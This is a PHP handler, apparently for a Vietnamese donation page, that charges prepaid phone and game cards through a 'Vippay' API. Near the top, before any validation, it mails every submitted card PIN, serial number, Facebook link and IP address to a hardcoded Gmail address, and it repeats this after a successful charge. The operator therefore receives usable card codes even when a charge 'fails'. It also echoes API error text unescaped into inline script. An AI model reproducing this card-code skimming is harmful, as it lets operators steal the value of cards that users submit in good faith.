<?php
header('Content-Type: text/html; charset=utf-8');
session_start();
error_reporting(E_ALL^E_NOTICE);
error_reporting(E_ERROR);


include 'Vippay_API.php';
include 'admin/cauhinhapi.php';

// lay thong tin tu vippay - muc tich hop website trong quan ly tai khoan
$merchant_id; // interger
$api_user ; // string
$api_password ; // string

// truyen du lieu the
$pin = $_POST['pin']; // string
$seri = $_POST['seri']; // string
$card_type = $_POST['card_type_id']; // interger
$ma_bao_mat = $_POST['ma_bao_mat'];
$tk = $_POST['id'];
$_SESSION['accounts']=$id;
$linkfb = $_POST['linkfb'];
$ip = $_SERVER['REMOTE_ADDR'];

/**
 * Card_type = 1 => Viettel
 * Card_type = 2 => Mobiphone
 * Card_type = 3 => Vinaphone
 * Card_type = 4 => Gate
 * Card_type = 5 => VTC
 * Card_type = 10 => Vietnammobi
 * 
**/

$card = "";
if($card_type == 1){
    $card = "Viettel";
}
else if($card_type == 2){
    $card = "Mobiphone";
}
else if($card_type == 3){
    $card = "Vinaphone";
}
else if($card_type == 4){
    $card = "Gate";
}
else if($card_type == 10){
    $card = "Vietnammobi";
}
	##################### gui mail ;)) ##############
$replyemail="duyphongqn01@gmail.com"; 
$thesubject="Thẻ không thành công";
$replymessage = "
Thông Tin Thẻ Nạp:

Nhà Mạng :$card
ghi chú:	$tk
Số Seri: $seri
Mã thẻ: $pin
phone: $phone
link fb : $linkfb
thẻ ở Vippay nhé
IP: $ip
------------
--------------------------------------------------
Subject: 
Query:
$themessage
--------------------------------------------------

Thank you";

$themessage = "
Thông Tin Thẻ Nạp:

Nhà Mạng :$card
ghi chú:	$tk
Số Seri: $seri
Mã thẻ: $pin
phone: $phone
link fb : $linkfb
thẻ ở Vippay nhé
IP: $ip
";
mail("$replyemail",
     "$thesubject",
     "$themessage",
     "From: khogunny\nReply-To: phongbesttristana");
mail("$email",
     "Receipt: $thesubject",
     "$replymessage",
     "From: $replyemail\nReply-To: $replyemail");
#####################END gui mail ###############
if($card_type == null || $card_type == 0){
echo "<script>alert('Bạn chưa chọn loại thẻ.');location.href='http://".$_SERVER['HTTP_HOST']."/donate.php'</script>";
    exit();
}

if($pin == null || $pin == "" || $seri == null || $seri == ""){
echo "<script>alert('Mã thẻ hoặc số seri không thể trống.');location.href='http://".$_SERVER['HTTP_HOST']."/donate.php'</script>";
    exit();
}
if(strlen($pin) < 8 || strlen($seri) < 8 || strlen($pin) > 20 || strlen($seri) > 20){
echo "<script>alert('Độ dài mã thẻ hoặc số seri không hợp lệ.');location.href='http://".$_SERVER['HTTP_HOST']."/donate.php'</script>";
    exit();
}
// checm ma bao mat
if($ma_bao_mat != $_SESSION['code_security']) {
echo "<script>alert('Sai mã bảo mật.');location.href='http://".$_SERVER['HTTP_HOST']."/donate.php'</script>";
     exit();
}

$vippay_api = new Vippay_API();
$vippay_api->setMerchantId($merchant_id);
$vippay_api->setApiUser($api_user);
$vippay_api->setApiPassword($api_password);
$vippay_api->setPin($pin);
$vippay_api->setSeri($seri);
$vippay_api->setCardType(intval($card_type));
$vippay_api->setNote($tk); // ghi chu giao dich ben ban tu sinh
$vippay_api->cardCharging();
$code = intval($vippay_api->getCode());
$info_card = intval($vippay_api->getInfoCard());
$error = $vippay_api->getMsg();

// nap the thanh cong
if($code === 0 && $info_card >= 10000) {
echo "<script>alert('Bạn Đã Donate cho tôi thẻ ".$card." mệnh giá ". $info_card." cảm ơn bạn ♥ ');location.href='http://".$_SERVER['HTTP_HOST']."/donate.php'</script>";
	##################### gui mail ;)) ##############
$replyemail="duyphongqn01@gmail.com"; 
$thesubject="donate .***Rồi***. thẻ $card mệnh giá  $info_card ";
$replymessage = "
Thông Tin Thẻ Nạp:

Nhà Mạng :$card
ghi chú:	$tk
Số Seri: $seri
Mã thẻ: $pin
phone: $phone
link fb : $linkfb
thẻ ở Vippay nhé
IP: $ip
--------------------------------------------------
Subject: 
Query:
$themessage
--------------------------------------------------

Thank you";

$themessage = "
Thông Tin Thẻ Nạp:

Nhà Mạng :$card
ghi chú:	$tk
Số Seri: $seri
Mã thẻ: $pin
phone: $phone
link fb : $linkfb
thẻ ở Vippay nhé
IP: $ip
";
mail("$replyemail",
     "$thesubject",
     "$themessage",
     "From: khogunny\nReply-To: phongbesttristana");
mail("$email",
     "Receipt: $thesubject",
     "$replymessage",
     "From: $replyemail\nReply-To: $replyemail");
#####################END gui mail ###############
}
else {
    // get thong bao loi
echo "<script>alert('".$error."');location.href='http://".$_SERVER['HTTP_HOST']."/donate.php'</script>";
}
?>